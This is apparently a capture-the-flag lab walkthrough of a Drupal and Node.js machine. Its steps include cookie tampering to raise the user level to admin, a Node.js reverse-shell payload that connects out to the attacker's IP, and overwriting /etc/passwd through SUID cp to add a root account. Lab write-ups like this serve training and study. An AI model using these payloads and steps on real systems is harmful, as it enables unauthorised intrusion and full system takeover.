```sh
nmap -sC -sV -oA dibble 192.168.55.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 18:57 CST
Nmap scan report for 192.168.55.110
Host is up (0.044s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.55
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 9d3feb1baa9c1eb1309b23534bcf5975 (RSA)
|   256 cddc05e6e3bb1233f7097450128a8564 (ECDSA)
|_  256 a0901f5078b39e412a7f5c6f4d0ea1fa (ED25519)
80/tcp   open  http    Apache httpd 2.4.46 ((Fedora))
|_http-generator: Drupal 9 (https://www.drupal.org)
|_http-title: Home | Hacking Articles
|_http-server-header: Apache/2.4.46 (Fedora)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.55 seconds

```

Robots.txt seemed interesting and had plenty of details. I was able to find the Drupal installed is 9.0.6.
I was not able to create an account or do anything special on the drupal install.
On port 3000 I was able to create a test account. But lacked permissions. I found this value in the header.
Userlevel is set to default
```
userLevel=ZGVmYXVsdA%3D%3D
```
Changed to admin
```
userLevel=YWRtaW4%3d
```

 I then found that the request includes a cooke + a value for user level. This is base64 encoded twice. I was able to test here and found `7*7` works when creating an event
 Found a working reverse shell:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(3000, "192.168.49.55", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

I was able to get in with above and nc running on port 3000

Once in, I ran linpeas and found this:
```sh
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
strings Not Found                                                                                                   
strace Not Found                                                                                                    
-rwsr-xr-x. 1 root root 91K Mar 26  2020 /usr/bin/gpasswd                                                           
-rwsr-xr-x. 1 root root 41K Jan 28  2020 /usr/bin/fusermount
-rwsr-xr-x. 1 root root 156K Apr 23  2020 /usr/bin/cp
-rwsr-xr-x. 1 root root 41K May 20  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
---s--x--x. 1 root root 183K Sep 15  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x. 1 root root 82K Mar 26  2020 /usr/bin/chage
-rwsr-xr-x. 1 root root 58K May 20  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                            
-rwsr-xr-x. 1 root root 37K Jan 29  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                 
-rwsr-xr-x. 1 root root 74K May 20  2020 /usr/bin/su
-rwsr-xr-x. 1 root root 47K Mar 26  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x. 1 root root 16K Sep 15  2020 /usr/sbin/grub2-set-bootflag (Unknown SUID binary!)
-rwsr-xr-x. 1 root root 45K Jun 24  2020 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 16K Jun 24  2020 /usr/sbin/pam_timestamp_check


```

We have SUID on cp. We can copy out the password file, edit it, upload it, and then login as root.

```
root:x:0:0:root:/root:/bin/bash
hacked:$5$testtest$AZu2my7RmwHNbaIzSDpaZmRXYFVFIrY4OcCQVooGEc4:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
systemd-timesync:x:998:996:systemd Time Synchronization:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:996:993::/var/lib/chrony:/sbin/nologin
benjamin:x:1000:1000::/home/benjamin:/bin/bash
mongod:x:995:992:mongod:/var/lib/mongo:/bin/false
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
```

Created the above with:
```
└─$ mkpasswd -m sha-256 -S testtest
Password: 
$5$testtest$AZu2my7RmwHNbaIzSDpaZmRXYFVFIrY4OcCQVooGEc4
└─$ python -m http.server 80            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.55.110 - - [06/Mar/2023 22:24:35] "GET /passwd HTTP/1.1" 200 -
```

```sh
[benjamin@dibble test]$ wget http://192.168.49.55/passwd
wget http://192.168.49.55/passwd
--2023-03-07 04:25:15--  http://192.168.49.55/passwd
Connecting to 192.168.49.55:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1425 (1.4K) [application/octet-stream]
Saving to: ‘passwd’

passwd              100%[===================>]   1.39K  --.-KB/s    in 0s      

2023-03-07 04:25:15 (381 MB/s) - ‘passwd’ saved [1425/1425]

[benjamin@dibble test]$ ls
ls
passwd
[benjamin@dibble test]$ cp passwd /etc/passwd
cp passwd /etc/passwd
[benjamin@dibble test]$ su - hacked
su - hacked
Password: Password123

[root@dibble ~]# whoami
whoami
root
[root@dibble ~]# cd /rot
cd /rot
-bash: cd: /rot: No such file or directory
[root@dibble ~]# cd /root
cd /root
[root@dibble ~]# ls
ls
proof.txt
[root@dibble ~]# cat proof.txt
cat proof.txt

```